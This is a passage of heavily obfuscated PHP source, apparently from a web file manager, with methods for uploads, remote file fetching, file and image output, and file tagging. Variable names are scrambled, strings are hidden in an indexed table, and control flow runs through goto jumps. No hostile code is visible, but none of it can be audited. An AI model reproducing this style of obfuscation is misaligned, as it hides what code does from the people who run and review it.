get_path_father($f†æ©Í¬á); $C£‰ˆ¿„Ş² = get_path_this($f†æ©Í¬á); $E§ï“ŠŞ£Ã = $this->model->fileInfoGet($eæ”‹•éï¬); $c‹÷©¿›Ü¼ = IO::copy($E§ï“ŠŞ£Ã[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]], $C…ƒë¬‡Ü, !1, $C£‰ˆ¿„Ş²); return $c‹÷©¿›Ü¼; } public function setModifyTime($bš•‡ƒÏÜ, $dÜ£Óñ…¨œ = '') { $this->model->metaSet($bš•‡ƒÏÜ, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1156], $dÜ£Óñ…¨œ); } public function upload($Fëæ²­¯Ë÷, $A³ø‰ª§Áø, $f–È‘½–ŠÌ = false, $A‡È¸ç™Ş = REPEAT_REPLACE) { $AÂ¾é¯Û°í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eâ©Ÿ‚°­æ = $this->parse($Fëæ²­¯Ë÷); $fõƒÀØçÊ = $this->model->addFile($eâ©Ÿ‚°­æ[$AÂ¾é¯Û°í[385]], $A³ø‰ª§Áø, $eâ©Ÿ‚°­æ[$AÂ¾é¯Û°í[75]], $f–È‘½–ŠÌ, $A‡È¸ç™Ş); return $this->getPathOuter($fõƒÀØçÊ); } public function uploadFileByID($AôİöŒ¼„, $AÙĞÊ«ò©¬, $d’ÚÂ¥ƒäæ) { $fÚªËâÉ§Ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f¬¿Á„×ğÅ = $this->parse($AôİöŒ¼„); $A¤»Úª‡‹¸ = $this->model->addFileByFileID($f¬¿Á„×ğÅ[$fÚªËâÉ§Ù[385]], $AÙĞÊ«ò©¬, $f¬¿Á„×ğÅ[$fÚªËâÉ§Ù[75]], $d’ÚÂ¥ƒäæ); return $this->getPathOuter($A¤»Úª‡‹¸); } public function addFileByRemote($D‚é¦ªº, $Dõ±øòºÉ‡, $C™ÓßÈƒ©ƒ = array(), $d¸ ½Éåíß = '', $b„ºˆî×¦ˆ) { $F¥ÛÑ­÷ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b„Ü‹¡·ˆí = $this->parse($D‚é¦ªº); $d¸ ½Éåíß = empty($d¸ ½Éåíß) ? $b„Ü‹¡·ˆí[$F¥ÛÑ­÷ó[75]] : $d¸ ½Éåíß; $eùÚø·‡ƒ˜ = $this->model->addFileByRemote($b„Ü‹¡·ˆí[$F¥ÛÑ­÷ó[385]], $Dõ±øòºÉ‡, $d¸ ½Éåíß, $C™ÓßÈƒ©ƒ, $b„ºˆî×¦ˆ); return $this->getPathOuter($eùÚø·‡ƒ˜); } public function uploadLink($AÖÎÃí¸Ù¡, $e¦˜Ã‚¦Ò¤ = 0) { $Fó¥Úß–‰Ñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eä¾ãØ‚İÆ = $this->parse($AÖÎÃí¸Ù¡); $AÖÎÃí¸Ù¡ = Model($Fó¥Úß–‰Ñ[560])->createFileName($eä¾ãØ‚İÆ[$Fó¥Úß–‰Ñ[75]]); $eÜÀ‡ßåÚ“ = IO::uploadLink($AÖÎÃí¸Ù¡, $e¦˜Ã‚¦Ò¤); return $eÜÀ‡ßåÚ“; } public function fileNameAuto($DÄÒ°¡ÇË, $f‰·÷—ñíã, $Bëùá½ß»â = REPEAT_REPLACE, $A®ŒêÏ„š = false) { return $this->model->fileNameAuto($DÄÒ°¡ÇË, $f‰·÷—ñíã, $Bëùá½ß»â, $A®ŒêÏ„š); } public function fileNameExist($Cœ¥±¿©Î, $D«  –‡É‡) { return $this->model->fileNameExist($Cœ¥±¿©Î, $D«  –‡É‡); } protected function _fileOut($DÑ«½…œ, $eÑï„Áæ› = false, $aõßé”éİĞ = false, $E²¤ÜÑ‚İ = '', $cª”ÓŞ¡À = false) { goto BÂÉË®ó¬Ú; BÂÉË®ó¬Ú: $eÈ‰±¦¥¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¨¿½¢Ñ“ = $this->model->sourceInfo($DÑ«½…œ); if ($c¨¿½¢Ñ“[$eÈ‰±¦¥¸[388]] == $eÈ‰±¦¥¸[86]) { header($eÈ‰±¦¥¸[1157]); die; } goto D÷­ã…«„“; D÷­ã…«„“: $e¡®Í¶ˆ·ï = $this->model->fileInfoGet($DÑ«½…œ); $E²¤ÜÑ‚İ = $e¡®Í¶ˆ·ï[$eÈ‰±¦¥¸[169]] ? $e¡®Í¶ˆ·ï[$eÈ‰±¦¥¸[169]] : $E²¤ÜÑ‚İ; $a”•Ø¢ô» = isset($GLOBALS[$eÈ‰±¦¥¸[1158]]) ? $GLOBALS[$eÈ‰±¦¥¸[1158]] : $c¨¿½¢Ñ“[$eÈ‰±¦¥¸[28]]; goto aÀŞÑÕÕò; aÀŞÑÕÕò: if ($cª”ÓŞ¡À) { return IO::fileOutServer($e¡®Í¶ˆ·ï[$eÈ‰±¦¥¸[75]], $eÑï„Áæ›, $a”•Ø¢ô», $E²¤ÜÑ‚İ); } IO::fileOut($e¡®Í¶ˆ·ï[$eÈ‰±¦¥¸[75]], $eÑï„Áæ›, $a”•Ø¢ô», $E²¤ÜÑ‚İ); goto CïÓ¤îŒ’À; CïÓ¤îŒ’À: } public function fileOut($cİÜŠÊÖ×Á, $C›†Õ‘õ‚Ë = false, $F•áˆŠ° = false, $Dšæà‡ƒŞ‚ = '') { $this->_fileOut($cİÜŠÊÖ×Á, $C›†Õ‘õ‚Ë, $F•áˆŠ°, $Dšæà‡ƒŞ‚); } public function fileOutServer($D®ªİØí«, $b·›Ö½—œ¹ = false, $C±¢×ìÕ²× = false, $F»¿Åï³Å = '') { $this->_fileOut($D®ªİØí«, $b·›Ö½—œ¹, $C±¢×ìÕ²×, $F»¿Åï³Å, !0); } protected function _fileOutImage($A±»†‚…”ö, $d ¸é‰Å = 250) { goto d¹ÜÑ‘»³; aõíß‰é‹Š: $GLOBALS[$B”õºœöó¢[1158]] = $dõ‘˜á³ˆ[$B”õºœöó¢[28]]; $GLOBALS[$B”õºœöó¢[161]] = $dõ‘˜á³ˆ; IO::fileOutImage($dõ‘˜á³ˆ[$B”õºœöó¢[75]], $d ¸é‰Å); goto f‰¹‹œİÂ¾; b‰„Çà½Ğ…: $dõ‘˜á³ˆ = $this->model->fileInfoGet($A±»†‚…”ö); $dõ‘˜á³ˆ[$B”õºœöó¢[28]] = $C”Ÿˆ¶¢×œ[$B”õºœöó¢[28]]; $dõ‘˜á³ˆ[$B”õºœöó¢[162]] = $C”Ÿˆ¶¢×œ[$B”õºœöó¢[162]]; goto aõíß‰é‹Š; d¹ÜÑ‘»³: $B”õºœöó¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C”Ÿˆ¶¢×œ = $this->model->pathInfo($A±»†‚…”ö); if ($C”Ÿˆ¶¢×œ[$B”õºœöó¢[388]] == $B”õºœöó¢[86]) { show_json($B”õºœöó¢[1159] . $A±»†‚…”ö, !1); } goto b‰„Çà½Ğ…; f‰¹‹œİÂ¾: } public function fileOutImage($Fç¸‡¶à‚·, $eÒÙô“È‡¼ = 250) { $this->_fileOutImage($Fç¸‡¶à‚·, $eÒÙô“È‡¼); } public function fileOutImageServer($b£ÀÔÛÍ„, $e²ˆ»ÒƒÜØ = 250) { $this->_fileOutImage($b£ÀÔÛÍ„, $e²ˆ»ÒƒÜØ); } public function link($d¸À³ŞÒÏö, $dÁ›ö·ñø = '') { $Eâ¿ÉÅë¨ = $this->model->fileInfoGet($d¸À³ŞÒÏö); return IO::link($Eâ¿ÉÅë¨[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]], $dÁ›ö·ñø); } protected function parse($BîŸŞ¨ºö‘) { $fìÙô¶å´¬ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (strstr($BîŸŞ¨ºö‘, $fìÙô¶å´¬[8]) === !1) { return array($fìÙô¶å´¬[403] => intval($BîŸŞ¨ºö‘), $fìÙô¶å´¬[75] => $fìÙô¶å´¬[33], $fìÙô¶å´¬[1155] => array()); } $cÓå¬ÙÊˆ = explode($fìÙô¶å´¬[8], trim($BîŸŞ¨ºö‘, $fìÙô¶å´¬[8])); if (count($cÓå¬ÙÊˆ) < 2) { show_tips($BîŸŞ¨ºö‘ . $fìÙô¶å´¬[1160]); } return array($fìÙô¶å´¬[403] => intval($cÓå¬ÙÊˆ[0]), $fìÙô¶å´¬[75] => $cÓå¬ÙÊˆ[1], $fìÙô¶å´¬[1155] => array_slice($cÓå¬ÙÊˆ, 1)); } } goto B‚ƒ†Ø¬Ä; A•éø„‹´÷: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($Eâ” ƒÂò¶) { $F’ôœŞ£ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($F’ôœŞ£[1738] => array(USER_ID, $F’ôœŞ£[1739])); } protected function listData() { $f‡«•ë›Í¥ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÃ×ï¦¤Ë = array($f‡«•ë›Í¥[1471] => USER_ID, $f‡«•ë›Í¥[452] => array($f‡«•ë›Í¥[1742], 0)); $d›½²ÌŠĞç = $f‡«•ë›Í¥[1744]; $f¼ªƒ´¾ÌÌ = $this->field($d›½²ÌŠĞç)->where($CÃ×ï¦¤Ë)->order($f‡«•ë›Í¥[1745])->select(); return $f¼ªƒ´¾ÌÌ ? $f¼ªƒ´¾ÌÌ : array(); } protected function listByTag($eÇàŒùÙ˜) { } protected function addToTag($CóÓ¨…éà, $e¾Ä¡‚¶) { $D“Ä“âÚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!Model($D“Ä“âÚ[1882])->listData($e¾Ä¡‚¶) || !Model($D“Ä“âÚ[745])->pathInfo($CóÓ¨…éà)) { return !1; } $d¤›‡ÙÜ‡ = array($D“Ä“âÚ[1471] => USER_ID, $D“Ä“âÚ[452] => $e¾Ä¡‚¶, $D“Ä“âÚ[405] => $CóÓ¨…éà, $D“Ä“âÚ[406] => $D“Ä“âÚ[400], $D“Ä“âÚ[404] => $D“Ä“âÚ[33], $D“Ä“âÚ[1642] => 0); if ($this->where($d¤›‡ÙÜ‡)->find()) { return !1; } return $this->add($d¤›‡ÙÜ‡); } protected function removeFromTag($FùĞİÉöµ¥, $FĞÏ”ÄÈ²˜) { $Eç…çèÂ¬Ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!Model($Eç…çèÂ¬Ù[1882])->listData($FĞÏ”ÄÈ²˜)) { return !1; } if (is_array($FùĞİÉöµ¥)) { $FùĞİÉöµ¥ = array($Eç…çèÂ¬Ù[7], $FùĞİÉöµ¥); } $d„Êò®¡¦ë = array($Eç…çèÂ¬Ù[1471] => USER_ID, $Eç…çèÂ¬Ù[452] => $FĞÏ”ÄÈ²˜, $Eç…çèÂ¬Ù[406] => $Eç…çèÂ¬Ù[400], $Eç…çèÂ¬Ù[405] => $FùĞİÉöµ¥); return $this->where($d„Êò®¡¦ë)->delete(); } protected function removeByTag($Bï†²§¯•ñ) { $B«ó¥šä´ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Bï†²§¯•ñ) { return !1; } $B¨‘Ó‹±ˆ± = array($B«ó¥šä´ô[1471] => USER_ID, $B«ó¥šä´ô[452] => $Bï†²§¯•ñ); return $this->where($B¨‘Ó‹±ˆ±)->delete(); } protected function removeBySource($fµç¾·°¢Ñ) { $fÕ“æºÆ– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_array($fµç¾·°¢Ñ)) { $fµç¾·°¢Ñ = array($fÕ“æºÆ–[7], $fµç¾·°¢Ñ); } $Eæ‰´„Î°ö = array($fÕ“æºÆ–[1471] => USER_ID, $fÕ“æºÆ–[405] => $fµç¾·°¢Ñ, $fÕ“æºÆ–[452] => array($fÕ“æºÆ–[923], 0)); return $this->where($Eæ‰´„Î°ö)->delete(); } }